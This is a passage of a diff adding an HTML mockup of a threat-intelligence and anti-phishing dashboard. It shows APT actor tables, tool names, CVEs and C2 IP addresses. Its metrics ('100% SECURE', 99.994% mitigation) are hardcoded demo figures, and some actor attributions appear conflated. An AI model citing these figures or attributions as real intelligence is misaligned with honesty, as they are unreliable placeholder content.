@@ -1,0 +1,2186 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CyWW ActiveAI | Military-Grade Zero Trust Anti-Phishing Defense Platform</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,600;0,700;1,400&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <!-- Ambient Grid & Glow -->
+  <div class="hud-grid-background"></div>
+  <div class="ambient-glow glow-top-left"></div>
+  <div class="ambient-glow glow-bottom-right"></div>
+
+  <!-- App Wrapper -->
+  <div id="app" class="cyww-app-container">
+    
+    <!-- TOP NAVIGATION BAR -->
+    <header class="top-nav">
+      <div class="nav-left">
+        <div class="brand-badge">
+          <div class="brand-logo-hex">
+            <svg viewBox="0 0 24 24" fill="none" class="hex-svg">
+              <polygon points="12,2 22,7 22,17 12,22 2,17 2,7" stroke="var(--accent-orange)" stroke-width="2" fill="rgba(255,107,0,0.12)" />
+              <circle cx="12" cy="12" r="3.5" fill="var(--accent-orange)" />
+              <path d="M12,5 L12,8 M12,16 L12,19 M5,12 L8,12 M16,12 L19,12" stroke="var(--accent-cyan)" stroke-width="1.5" />
+            </svg>
+          </div>
+          <div class="brand-names">
+            <div class="brand-title">CyWW <span class="brand-accent">ActiveAI</span></div>
+            <div class="brand-sub">DEFENSE-GRADE ZERO TRUST MAIL & ENDPOINT SUITE</div>
+          </div>
+        </div>
+
+        <!-- PRIMARY NAV TABS -->
+        <nav class="nav-links" id="primary-nav">
+          <button class="nav-item active" data-view="topology">
+            <span class="nav-icon">⛯</span> Pattern of Life
+          </button>
+          <button class="nav-item" data-view="threat-map">
+            <span class="nav-icon">🌐</span> Global Threat Map
+          </button>
+          <button class="nav-item" data-view="ingestion">
+            <span class="nav-icon">✉</span> Ingestion & Auth
+          </button>
+          <button class="nav-item" data-view="sandboxing">
+            <span class="nav-icon">☣</span> Analysis & Sandbox
+          </button>
+          <button class="nav-item" data-view="orchestration">
+            <span class="nav-icon">⚙</span> SOAR Orchestration
+          </button>
+          <button class="nav-item" data-view="simulation">
+            <span class="nav-icon">🎯</span> Simulation & Training
+          </button>
+          <button class="nav-item" data-view="triage">
+            <span class="nav-icon">⚡</span> AI Analyst Desk <span id="badge-active-incidents" class="alert-pill">3 ACTIVE</span>
+          </button>
+          <button class="nav-item" data-view="vapt">
+            <span class="nav-icon">🛡️</span> VAPT Report <span class="badge-safe" style="font-size:10px; padding:2px 6px; border-radius:4px; background:rgba(0,255,157,0.15); color:var(--accent-green); font-weight:800;">100% SECURE</span>
+          </button>
+        </nav>
+      </div>
+
+      <div class="nav-right">
+        <!-- Day/Night Mode Switch -->
+        <div class="theme-switch-wrapper">
+          <button id="theme-toggle-btn" class="theme-toggle-btn" title="Toggle Day / Night Mode">
+            <span id="theme-icon" class="theme-icon">🌙</span>
+            <span id="theme-text" class="theme-text">NIGHT</span>
+          </button>
+        </div>
+
+        <!-- Antigena Autonomous Response Toggle -->
+        <div class="antigena-status-card">
+          <div class="antigena-top">
+            <div class="pulse-dot active"></div>
+            <span class="antigena-title">CYWW ANTIGENA</span>
+            <span class="antigena-mode" id="antigena-mode-text">AUTONOMOUS</span>
+          </div>
+          <div class="toggle-wrapper">
+            <span class="toggle-lbl">Passive</span>
+            <label class="switch">
+              <input type="checkbox" id="autonomous-toggle" checked />
+              <span class="slider round"></span>
+            </label>
+            <span class="toggle-lbl active">Active</span>
+          </div>
+        </div>
+
+        <!-- Telemetry Clock & Security Health -->
+        <div class="system-telemetry">
+          <div id="sys-clock" class="sys-clock">00:00:00 UTC</div>
+          <div class="sys-health"><span class="health-dot"></span> ZTA CORE: OPTIMAL</div>
+        </div>
+      </div>
+    </header>
+
+    <!-- METRICS RIBBON (Key Operational Metrics) -->
+    <section class="telemetry-ribbon">
+      <div class="ribbon-card">
+        <div class="card-icon-wrap icon-cyan">✉</div>
+        <div class="card-data">
+          <div class="data-val" id="metric-messages-analyzed">148,290</div>
+          <div class="data-lbl">Mails Ingested (24h)</div>
+        </div>
+        <div class="sparkline-trend positive">Edge MTA 0.02s</div>
+      </div>
+
+      <div class="ribbon-card">
+        <div class="card-icon-wrap icon-orange">⚡</div>
+        <div class="card-data">
+          <div class="data-val text-orange" id="metric-novel-threats">42</div>
+          <div class="data-lbl">Novel 0-Days Caught</div>
+        </div>
+        <div class="sparkline-trend alert">Patient Zero: 0</div>
+      </div>
+
+      <div class="ribbon-card">
+        <div class="card-icon-wrap icon-green">🛡</div>
+        <div class="card-data">
+          <div class="data-val text-green" id="metric-lead-time">13.6 Days</div>
+          <div class="data-lbl">Lead Time vs Legacy SEGs</div>
+        </div>
+        <div class="sparkline-trend positive">Unsupervised AI</div>
+      </div>
+
+      <div class="ribbon-card">
+        <div class="card-icon-wrap icon-purple">🤖</div>
+        <div class="card-data">
+          <div class="data-val text-purple" id="metric-triage-reduction">64%</div>
+          <div class="data-lbl">SOC Investigation Relief</div>
+        </div>
+        <div class="sparkline-trend positive">Auto-Triage</div>
+      </div>
+
+      <div class="ribbon-card">
+        <div class="card-icon-wrap icon-red">🛑</div>
+        <div class="card-data">
+          <div class="data-val text-red" id="metric-antigena-actions">89</div>
+          <div class="data-lbl">Autonomous Interventions</div>
+        </div>
+        <div class="sparkline-trend alert">&lt; 0.04s Response</div>
+      </div>
+    </section>
+
+    <!-- MAIN DASHBOARD BODY -->
+    <main class="dashboard-body">
+      
+      <!-- STAGE CONTAINER (VIEWS) -->
+      <section class="main-stage">
+        
+        <!-- ========================================================================= -->
+        <!-- VIEW 1: PATTERN OF LIFE TOPOLOGY & HUMAN BEHAVIORAL INTELLIGENCE -->
+        <!-- ========================================================================= -->
+        <div id="view-topology" class="stage-view active">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Human Behavioral AI: Pattern of Life Constellation</h2>
+              <p class="stage-desc">Unsupervised clustering of employee communication graphs, peer group baselines, and synthetic anomaly detection.</p>
+            </div>
+            <div class="stage-actions">
+              <!-- Clear, well-formatted Legend with colored pills -->
+              <div class="legend-group">
+                <span class="legend-item"><span class="dot dot-normal" style="background:var(--accent-green);"></span> Normal Baseline</span>
+                <span class="legend-item"><span class="dot dot-anomaly" style="background:var(--accent-orange);"></span> Behavioral Drift (+3&sigma;)</span>
+                <span class="legend-item"><span class="dot dot-threat" style="background:var(--accent-red);"></span> Active Attack (+6&sigma;)</span>
+              </div>
+              <div class="threat-filter-group" style="margin-left: 8px;">
+                <button id="topo-filter-all" class="threat-filter-btn active">All Peer Groups</button>
+                <button id="topo-filter-anomalies" class="threat-filter-btn">🚨 Anomalies Only (3)</button>
+                <button id="topo-filter-vips" class="threat-filter-btn">👑 VIPs &amp; Execs</button>
+                <button id="topo-filter-treasury" class="threat-filter-btn">💼 Treasury</button>
+              </div>
+              <button id="btn-inject-anomaly" class="hud-btn hud-btn-accent hud-btn-sm">⚡ Simulate Outlier</button>
+              <button id="btn-reset-zoom" class="hud-btn hud-btn-sm">🔄 Reset</button>
+            </div>
+          </div>
+
+          <!-- Top Human-Centric KPI Ribbon -->
+          <div class="simulation-dashboard-grid" style="margin-bottom: 12px;">
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Monitored Human Identities</div>
+              <div class="sim-metric-val text-cyan">1,480 Profiles</div>
+              <div class="sim-metric-sub">Across 18 Global OUs &amp; Peer Groups</div>
+            </div>
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Pattern of Life Moving Baseline</div>
+              <div class="sim-metric-val text-green">48 Days</div>
+              <div class="sim-metric-sub">99.84% Statistical Modeling Fidelity</div>
+            </div>
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Active Behavioral Outliers</div>
+              <div class="sim-metric-val text-red" id="hud-anomaly-count">3 Identities</div>
+              <div class="sim-metric-sub">&gt; 6.2&sigma; Deviation from Peer Norms</div>
+            </div>
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Autonomous ZTA Interceptions</div>
+              <div class="sim-metric-val text-orange">14 Mitigations</div>
+              <div class="sim-metric-sub">Mean Intervention Latency: 0.024s</div>
+            </div>
+          </div>
+
+          <!-- Split Workspace: Canvas Constellation + Human-Centric Identity Deep-Dive Dossier -->
+          <div class="sandboxing-grid" style="grid-template-columns: 1fr 420px; gap: 14px; flex: 1; min-height: 480px;">
+            
+            <!-- Left: Interactive Graph Constellation Canvas -->
+            <div class="card" style="display: flex; flex-direction: column; position: relative; padding: 0; overflow: hidden; height: 520px;">
+              <canvas id="topologyCanvas" style="width: 100%; height: 100%; display: block;"></canvas>
+              
+              <!-- Subtle in-canvas HUD overlay -->
+              <div class="canvas-overlay-hud" style="pointer-events: none;">
+                <div class="hud-corner top-left" style="background: rgba(9, 13, 22, 0.75); backdrop-filter: blur(8px); padding: 8px 12px; border-radius: 6px; border: 1px solid var(--border-subtle);">
+                  <div class="hud-tag" style="color:var(--accent-cyan); font-weight:800;">UNSUPERVISED BEHAVIORAL GRAPH</div>
+                  <div class="hud-metric" style="font-size:11px;">CLUSTERS: <span id="hud-clusters-count" class="font-mono text-cyan">4 PEER GROUPS</span></div>
+                  <div class="hud-metric" style="font-size:11px;">COMMUNICATION VECTORS: <span id="hud-arcs-count" class="font-mono text-green">18 EDGES</span></div>
+                  <div class="hud-metric" style="font-size:11px;">STATUS: <span style="color:var(--accent-green); font-weight:700;">REAL-TIME GRAPH STREAM</span></div>
+                </div>
+                <div class="hud-corner bottom-left" style="pointer-events: auto;">
+                  <div class="hud-node-preview" id="node-hover-info" style="max-width: 420px; font-size: 11px;">
+                    💡 Click or hover on any individual employee or partner node to inspect their Human Behavioral Dossier.
+                  </div>
+                </div>
+                <div class="hud-corner bottom-right" style="pointer-events: auto;">
+                  <div class="hud-audio-toggle" id="audio-toggle-btn" style="cursor: pointer;">🔊 AUDIO TELEMETRY: ON</div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Right: Human-Centric Identity Deep-Dive Dossier Pane -->
+            <div class="card" id="human-dossier-card" style="display: flex; flex-direction: column; overflow-y: auto; max-height: 520px; padding: 16px;">
+              <div id="dossier-content">
+                <!-- Injected dynamically via JS when node is selected or hovered -->
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 1B: CTI FUSION & CYBER THREAT RADAR (APTMAP, OPENCTI, MISP, MITRE) -->
+        <!-- ========================================================================= -->
+        <div id="view-threat-map" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Cyber Threat Intelligence (CTI) Fusion &amp; Global Radar</h2>
+              <p class="stage-desc">Integrated threat intelligence blending Radware/Fortinet ballistic telemetry, APTMAP (Andrea Cristaldi), G-APT-Monitor, OpenCTI STIX2 graphs, MISP feeds, and MITRE ATT&amp;CK Navigator.</p>
+            </div>
+            <div class="stage-actions">
+              <!-- Radware-Style Vulnerability & Threat Vector Filters -->
+              <div class="threat-filter-group" id="map-vulnerability-filters">
+                <button class="threat-filter-btn active" data-filter="all">All Vectors</button>
+                <button class="threat-filter-btn" data-filter="aitm">AiTM &amp; Session Steal (CWE-287)</button>
+                <button class="threat-filter-btn" data-filter="bec">BEC Wire Fraud (T1566.002)</button>
+                <button class="threat-filter-btn" data-filter="attachments">Zero-Days (CVE-2024-21413)</button>
+                <button class="threat-filter-btn" data-filter="quishing">Quishing (QR Optical)</button>
+                <button class="threat-filter-btn" data-filter="ddos">DDoS &amp; Volumetric</button>
+              </div>
+              <button id="btn-toggle-threat-speed" class="hud-btn hud-btn-sm">⚡ Surge Simulation</button>
+            </div>
+          </div>
+
+          <!-- Intel Fusion Suite Mode Switcher -->
+          <div class="intel-mode-switcher" id="intel-mode-switcher">
+            <button class="hud-btn hud-btn-sm active" data-intel-mode="radar">🌐 Live Ballistic Radar (Radware/Fortinet)</button>
+            <button class="hud-btn hud-btn-sm" data-intel-mode="aptmap">🗺️ APTMAP (Andrea Cristaldi) &amp; G-APT Monitor</button>
+            <button class="hud-btn hud-btn-sm" data-intel-mode="opencti">🕸️ OpenCTI STIX 2.1 Graph</button>
+            <button class="hud-btn hud-btn-sm" data-intel-mode="misp">⚡ MISP Threat Sharing &amp; Warnings</button>
+            <button class="hud-btn hud-btn-sm" data-intel-mode="mitre">🎯 MITRE ATT&amp;CK Navigator Matrix</button>
+          </div>
+
+          <!-- SUB-VIEW 1: LIVE RADWARE BALLISTIC RADAR -->
+          <div id="intel-subview-radar" class="intel-subview active">
+
+          <!-- Top Section: Interactive Map Canvas with Zoom & Pan -->
+          <div class="canvas-container threat-map-canvas-container" style="height: 540px; min-height: 540px; flex-shrink: 0; position: relative;">
+            <canvas id="globalMapCanvas"></canvas>
+            
+            <!-- In-Canvas Zoom & Pan HUD Controls (Radware Style) -->
+            <div class="map-zoom-controls">
+              <button id="btn-map-zoom-in" title="Zoom In (+)">➕</button>
+              <button id="btn-map-zoom-out" title="Zoom Out (-)">➖</button>
+              <button id="btn-map-zoom-reset" title="Reset View (⟲)">⟲</button>
+              <button id="btn-map-fullscreen" title="Toggle Fullscreen (⛶)">⛶</button>
+              <span class="zoom-level-tag" id="map-zoom-level">1.0x</span>
+            </div>
+
+            <!-- Kaspersky Cyberthreat Real-Time Map Country Intelligence Dossier -->
+            <div id="kaspersky-dossier-card" class="kaspersky-dossier-card">
+              <div class="dossier-header">
+                <div class="dossier-country-name" id="dossier-country-name">UNITED STATES</div>
+                <div class="dossier-rank" id="dossier-rank"># 5 MOST-ATTACKED COUNTRY</div>
+              </div>
+              <div class="dossier-stats-table">
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-green">OAS</span> <span class="dossier-sub">On-Access Scan</span></div>
+                  <span class="dossier-val" id="dossier-oas">33,912</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-orange">ODS</span> <span class="dossier-sub">On-Demand Scan</span></div>
+                  <span class="dossier-val" id="dossier-ods">48,426</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-red">MAV</span> <span class="dossier-sub">Mail Anti-Virus</span></div>
+                  <span class="dossier-val" id="dossier-mav">486</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-cyan">WAV</span> <span class="dossier-sub">Web Anti-Virus</span></div>
+                  <span class="dossier-val" id="dossier-wav">20,205</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-pink">IDS</span> <span class="dossier-sub">Intrusion Detect</span></div>
+                  <span class="dossier-val" id="dossier-ids">86,957</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-yellow">VUL</span> <span class="dossier-sub">Vulnerabilities</span></div>
+                  <span class="dossier-val" id="dossier-vul">2,557</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-blue">KAS</span> <span class="dossier-sub">Anti-Spam / Phish</span></div>
+                  <span class="dossier-val" id="dossier-kas">46,098</span>
+                </div>
+                <div class="dossier-row">
+                  <div class="dossier-left"><span class="dossier-key text-teal">BAD</span> <span class="dossier-sub">Botnet Activity</span></div>
+                  <span class="dossier-val" id="dossier-bad">2</span>
+                </div>
+              </div>
+              <div class="dossier-footer">
+                <div class="dossier-footer-label">Detections discovered since 00:00 GMT</div>
+                <div class="dossier-footer-total" id="dossier-total">238,643</div>
+                <div class="dossier-actions">
+                  <span class="dossier-link" id="btn-export-country-pdf">📄 PDF Dossier</span> • <span class="dossier-link" id="btn-export-country-json">📥 JSON</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Real-Time Live Incident Stream Floating Overlay inside Visualisation -->
+            <div id="canvas-incident-stream-overlay" class="canvas-stream-overlay">
+              <div class="stream-overlay-header">
+                <div style="display:flex; align-items:center; gap:7px;">
+                  <span class="live-indicator"></span>
+                  <span style="font-weight:900; font-size:10.5px; color:#ffffff; letter-spacing:0.04em;">REAL-TIME LIVE INCIDENT STREAM</span>
+                </div>
+                <div style="display:flex; align-items:center; gap:6px;">
+                  <span class="stream-badge-count" id="overlay-stream-count">42 Intercepts/min</span>
+                  <button id="btn-toggle-overlay-stream" class="hud-btn hud-btn-xs" style="padding:1px 6px;" title="Minimize / Expand Stream">↕</button>
+                </div>
+              </div>
+              <div class="stream-overlay-content" id="overlay-stream-items">
+                <!-- Dynamically populated via JS as attacks strike -->
+              </div>
+            </div>
+
+            <!-- Graphical Component Overlay on Site Hover -->
+            <div id="site-hover-card" class="site-hover-card"></div>
+
+            <div class="canvas-overlay-hud">
+              <div class="hud-corner top-left" style="left: 278px;">
+                <div class="hud-tag">CYBERTHREAT REAL-TIME MAP &amp; EDGE MTA SENSORS</div>
+                <div class="hud-metric">ACTIVE BALLISTIC RAYS: <span id="hud-active-arcs" style="color:var(--accent-orange)">36</span></div>
+                <div class="hud-metric">GLOBAL MITIGATION: <span style="color:var(--accent-green)">99.994%</span></div>
+                <div class="hud-metric">SCRUBBING VELOCITY: <span id="hud-stream-velocity" class="font-mono text-cyan">18,490 msg/sec</span></div>
+              </div>
+              <div class="hud-corner top-right" style="max-width: 380px; margin-right: 50px; display:none;">
+                <div class="outbreak-alert-pill">
+                  <div class="pulse-dot" style="background: var(--accent-red); box-shadow: 0 0 8px var(--accent-red);"></div>
+                  <div>
+                    <div style="font-size: 10px; font-weight: 800; color: var(--accent-red);">ACTIVE OUTBREAK CAMPAIGN (KSN / DECEPTION)</div>
+                    <div style="font-size: 9px; color: #ffffff; font-family: monospace;">Storm-1167: AiTM Reverse Proxy Kit targeting Cloud IdPs</div>
+                  </div>
+                </div>
+              </div>
+              <div class="hud-corner bottom-left" style="left: 278px;">
+                <div class="hud-node-preview" id="map-telemetry-ticker">
+                  🔴 INBOUND THREAT INTERCEPT: BEC Wire Fraud [Origin: 185.220.101.44 (NL) -> Destination: New York (US)]
+                </div>
+              </div>
+              <div class="hud-corner bottom-right" style="font-size: 10px; color: var(--text-muted); font-family: var(--font-mono); background: rgba(9,13,22,0.6); padding: 4px 8px; border-radius: 4px;">
+                🖱️ Mouse drag to Pan • Scroll wheel or [+][-] to Zoom • Drag Splitter below to resize
+              </div>
+            </div>
+          </div>
+
+          <!-- Vertical Splitter Handle to Scale Map & Bottom Pane -->
+          <div id="threat-map-resizer" class="pane-resizer-v" title="Drag vertically to resize visualization height and bottom incident stream table">
+            <div class="resizer-handle-bar"></div>
+          </div>
+
+          <!-- Bottom Section: Fortinet-Style Live Incident Stream & Unit 42 Intelligence -->
+          <div id="threat-intel-lower-grid" class="threat-intel-lower-grid" style="margin-top: 4px; display: grid; grid-template-columns: 1fr 340px; gap: 12px; flex: 1; min-height: 300px;">
+            <!-- Left: Real-Time Incident Stream Table (Fortinet Style) -->
+            <div class="card" style="display: flex; flex-direction: column; overflow: hidden;">
+              <div class="card-header">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                  <span class="live-indicator"></span>
+                  <span class="card-title">Real-Time Global Email Incident Stream (Live Feed)</span>
+                </div>
+                <span class="font-mono text-cyan" style="font-size: 10px;">Sensor Nodes: 4,890 Edge MTAs</span>
+              </div>
+              <div class="threat-stream-table-wrap" style="flex: 1; overflow-y: auto;">
+                <table class="threat-stream-table" id="threat-stream-table">
+                  <thead>
+                    <tr>
+                      <th>Time (UTC)</th>
+                      <th>Attack Vector / Lure</th>
+                      <th>Severity</th>
+                      <th>Source Origin</th>
+                      <th>Target Entity / Sector</th>
+                      <th>MITRE ID</th>
+                      <th>CyWW Mitigation</th>
+                    </tr>
+                  </thead>
+                  <tbody id="threat-stream-tbody">
+                    <!-- Dynamically populated via JS -->
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <!-- Right: Fortinet Leaderboard & Palo Alto Unit 42 Threat Actors -->
+            <div style="display: flex; flex-direction: column; gap: 12px;">
+              <!-- Top Origin Nations & Sectors -->
+              <div class="card">
+                <div class="card-header">
+                  <span class="card-title">Top Attack Origin Vectors</span>
+                  <span class="font-mono text-secondary" style="font-size: 9px;">Last 24h</span>
+                </div>
+                <div class="leaderboard-list">
+                  <div class="leaderboard-item">
+                    <div class="leaderboard-info">
+                      <span>🇳🇱 Netherlands (Bulletproof ASN)</span>
+                      <strong class="font-mono text-red">31.4%</strong>
+                    </div>
+                    <div class="leaderboard-track"><div class="leaderboard-fill" style="width: 31.4%; background: var(--accent-red);"></div></div>
+                  </div>
+                  <div class="leaderboard-item">
+                    <div class="leaderboard-info">
+                      <span>🇷🇺 Russia (AiTM Reverse Proxy)</span>
+                      <strong class="font-mono text-orange">26.8%</strong>
+                    </div>
+                    <div class="leaderboard-track"><div class="leaderboard-fill" style="width: 26.8%; background: var(--accent-orange);"></div></div>
+                  </div>
+                  <div class="leaderboard-item">
+                    <div class="leaderboard-info">
+                      <span>🇳🇬 Nigeria (BEC Wire Syndicate)</span>
+                      <strong class="font-mono text-orange">19.5%</strong>
+                    </div>
+                    <div class="leaderboard-track"><div class="leaderboard-fill" style="width: 19.5%; background: var(--accent-orange);"></div></div>
+                  </div>
+                  <div class="leaderboard-item">
+                    <div class="leaderboard-info">
+                      <span>🇨🇳 China (APT Spearphish Lures)</span>
+                      <strong class="font-mono text-purple">14.2%</strong>
+                    </div>
+                    <div class="leaderboard-track"><div class="leaderboard-fill" style="width: 14.2%; background: var(--accent-purple);"></div></div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Palo Alto Unit 42 Threat Actor Dossier -->
+              <div class="card" style="flex: 1;">
+                <div class="card-header">
+                  <span class="card-title">Unit 42 Active Threat Actor Dossier</span>
+                  <span class="pill-tag pill-purple">TRACKING 18 APTS</span>
+                </div>
+                <div class="actor-dossier-list" id="actor-dossier-list">
+                  <div class="actor-card">
+                    <div class="actor-header">
+                      <strong style="color:#ffffff;">Midnight Blizzard (APT29)</strong>
+                      <span class="pill-tag pill-red">NATION STATE</span>
+                    </div>
+                    <div class="actor-meta">TTPs: OAuth Token Stealing, AiTM Device Code Phishing, CVE-2024-21413</div>
+                    <div class="actor-target">Targeting: Defense, Foreign Ministries, Financial Treasuries</div>
+                  </div>
+                  <div class="actor-card">
+                    <div class="actor-header">
+                      <strong style="color:#ffffff;">Scattered Spider (UNC3944)</strong>
+                      <span class="pill-tag pill-orange">CYBERCRIME</span>
+                    </div>
+                    <div class="actor-meta">TTPs: MFA Fatigue, Quishing QR Infiltration, Okta Identity Hijacking</div>
+                    <div class="actor-target">Targeting: SaaS Providers, Financial Services, Telecommunications</div>
+                  </div>
+                </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- END OF intel-subview-radar -->
+
+        <!-- ========================================================================= -->
+        <!-- SUB-VIEW 2: APTMAP (ANDREA CRISTALDI) & G-APT-MONITOR -->
+        <!-- ========================================================================= -->
+        <div id="intel-subview-aptmap" class="intel-subview">
+          <div class="card" style="margin-bottom:12px;">
+            <div class="card-header">
+              <div style="display:flex; align-items:center; gap:8px;">
+                <span class="live-indicator"></span>
+                <span class="card-title">APTMAP (Andrea Cristaldi Architecture) &amp; G-APT Campaign Monitor</span>
+              </div>
+              <span class="pill-tag pill-purple">18 NATION-STATE APTS TRACKED</span>
+            </div>
+            <p style="font-size:12px; color:var(--text-secondary); margin-bottom:12px;">
+              Geopolitical Advanced Persistent Threat (APT) mapping tracking threat actors, sponsoring nation-states, targeted industry verticals, initial access toolkits, and real-time C2 beacon heartbeats.
+            </p>
+            <div class="aptmap-grid">
+              <!-- Left: APTMAP Global Threat Group Matrix Table -->
+              <div style="overflow-x:auto;">
+                <table class="apt-table">
+                  <thead>
+                    <tr>
+                      <th>Nation-State / Origin</th>
+                      <th>APT Actor &amp; Aliases</th>
+                      <th>Targeted Verticals</th>
+                      <th>Toolkits &amp; CVE Exploits</th>
+                      <th>CyWW Autonomous Mitigation</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td><span style="font-size:16px;">🇷🇺</span> <strong>Russia</strong><br><span style="font-size:9px; color:var(--text-muted);">SVR RF Foreign Intel</span></td>
+                      <td><strong style="color:var(--accent-red);">APT29</strong><br><span style="font-size:10px; color:var(--text-secondary);">Midnight Blizzard / Nobelium</span></td>
+                      <td>Cloud IdP Tenants, Foreign Ministries, Defense Contractors</td>
+                      <td><code>Evilginx2</code>, <code>MagicWeb</code>, <code>CVE-2024-21413</code>, AiTM Session Stealing</td>
+                      <td><span class="pill-tag pill-green">SSIM Pre-Paint Form Lock + Token Revoke</span></td>
+                    </tr>
+                    <tr>
+                      <td><span style="font-size:16px;">🇷🇺</span> <strong>Russia</strong><br><span style="font-size:9px; color:var(--text-muted);">GRU 85th GTsSS</span></td>
+                      <td><strong style="color:var(--accent-red);">APT28</strong><br><span style="font-size:10px; color:var(--text-secondary);">Fancy Bear / Forest Blizzard</span></td>
+                      <td>Government, NATO Energy, Critical Infrastructure</td>
+                      <td><code>X-Agent</code>, <code>Zebrocy</code>, <code>CVE-2023-23397</code> (Outlook NTLM leak)</td>
+                      <td><span class="pill-tag pill-green">Pre-Auth NTLM Header Strip &amp; DMARC Reject</span></td>
+                    </tr>
+                    <tr>
+                      <td><span style="font-size:16px;">🇨🇳</span> <strong>China</strong><br><span style="font-size:9px; color:var(--text-muted);">MSS / Hainan APT</span></td>
+                      <td><strong style="color:var(--accent-purple);">APT40 / Volt Typhoon</strong><br><span style="font-size:10px; color:var(--text-secondary);">Bronze Mohawk / Storm-0091</span></td>
+                      <td>Telecom Providers, Maritime Ports, Cloud Hypervisors</td>
+                      <td><code>Cobalt Strike</code>, <code>Living-off-the-Land</code>, <code>CVE-2024-21413</code></td>
+                      <td><span class="pill-tag pill-green">CAPE Hypervisor VM In-Memory Hook &amp; Drop</span></td>
+                    </tr>
+                    <tr>
+                      <td><span style="font-size:16px;">🇰🇵</span> <strong>North Korea</strong><br><span style="font-size:9px; color:var(--text-muted);">RGB Lab 110</span></td>
+                      <td><strong style="color:var(--accent-orange);">Lazarus Group</strong><br><span style="font-size:10px; color:var(--text-secondary);">APT38 / Hidden Cobra / BlueNoroff</span></td>
+                      <td>Cryptocurrency Exchanges, FinTech, Swift Banking</td>
+                      <td><code>AppleJeus</code>, <code>Dtrack</code>, <code>FastCash</code>, Weaponized Lures</td>
+                      <td><span class="pill-tag pill-green">AI Syntactic BEC Mimicry + IBAN Sanity Quarantine</span></td>
+                    </tr>
+                    <tr>
+                      <td><span style="font-size:16px;">🇮🇷</span> <strong>Iran</strong><br><span style="font-size:9px; color:var(--text-muted);">IRGC Intelligence</span></td>
+                      <td><strong style="color:var(--accent-cyan);">APT35 / Charming Kitten</strong><br><span style="font-size:10px; color:var(--text-secondary);">Mint Sandstorm / Phosphorus</span></td>
+                      <td>Human Rights Think Tanks, Aerospace, Diplomatic Corps</td>
+                      <td><code>Hyperscrape</code>, <code>CharmPower</code>, Quishing QR Code Lures</td>
+                      <td><span class="pill-tag pill-green">Visual OCR Neural QR Scanner + Link Neutralize</span></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <!-- Right: G-APT-Monitor Active C2 Telemetry -->
+              <div style="display:flex; flex-direction:column; gap:10px;">
+                <div class="card" style="background:var(--bg-card); padding:12px;">
+                  <div class="card-title" style="font-size:11px; margin-bottom:8px;">G-APT Active C2 Telemetry &amp; Beacons</div>
+                  <div style="font-size:11px; display:flex; flex-direction:column; gap:8px;">
+                    <div style="padding:8px; background:var(--bg-panel); border-radius:4px; border:1px solid var(--border-subtle);">
+                      <div style="display:flex; justify-content:space-between; font-weight:700;">
+                        <span>194.26.29.112 (Midnight Blizzard)</span>
+                        <span class="text-orange">ACTIVE BEACON</span>
+                      </div>
+                      <div style="font-size:10px; color:var(--text-secondary);">Beacon Interval: 45s • Protocol: TLS 1.3 / WebSocket • DNS: Sinkholed</div>
+                    </div>
+                    <div style="padding:8px; background:var(--bg-panel); border-radius:4px; border:1px solid var(--border-subtle);">
+                      <div style="display:flex; justify-content:space-between; font-weight:700;">
+                        <span>218.77.130.8 (Volt Typhoon C2)</span>
+                        <span class="text-red">BLOCKED</span>
+                      </div>
+                      <div style="font-size:10px; color:var(--text-secondary);">Payload: Cobalt Strike Stage 2 • ASN: AS4134 • Edge Drop: 0.02s</div>
+                    </div>
+                    <div style="padding:8px; background:var(--bg-panel); border-radius:4px; border:1px solid var(--border-subtle);">
+                      <div style="display:flex; justify-content:space-between; font-weight:700;">
+                        <span>185.220.101.44 (Storm-1167 Tor Exit)</span>
+                        <span class="text-green">ISOLATED</span>
+                      </div>
+                      <div style="font-size:10px; color:var(--text-secondary);">Traffic: M&amp;A BEC Wire • ASN: AS20412 • ZTA Challenge Dispatched</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- SUB-VIEW 3: OPENCTI STIX 2.1 THREAT KNOWLEDGE GRAPH -->
+        <!-- ========================================================================= -->
+        <div id="intel-subview-opencti" class="intel-subview">
+          <div class="card">
+            <div class="card-header">
+              <div style="display:flex; align-items:center; gap:8px;">
+                <span class="live-indicator"></span>
+                <span class="card-title">OpenCTI STIX 2.1 Threat Knowledge Graph &amp; Observable Mesh</span>
+              </div>
+              <div style="display:flex; gap:8px;">
+                <button id="btn-toggle-stix-json" class="hud-btn hud-btn-sm">📜 View STIX 2.1 JSON Bundle</button>
+                <span class="pill-tag pill-green">98% CONFIDENCE SCORE</span>
+              </div>
+            </div>
